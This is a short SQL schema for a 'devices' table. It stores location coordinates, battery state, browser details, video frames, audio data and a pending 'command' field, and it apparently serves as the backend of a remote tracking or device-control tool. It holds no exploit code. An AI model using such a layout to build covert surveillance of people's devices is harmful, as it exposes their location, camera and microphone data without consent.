CREATE TABLE IF NOT EXISTS devices (
    id TEXT PRIMARY KEY,
    lat TEXT,
    lng TEXT,
    accuracy REAL,
    device TEXT,
    browser TEXT,
    battery TEXT,
    charging TEXT,
    lastSeen TEXT,
    lastPing REAL,
    video_frame TEXT,
    video_time TEXT,
    audio_data TEXT,
    audio_time TEXT,
    command TEXT
);
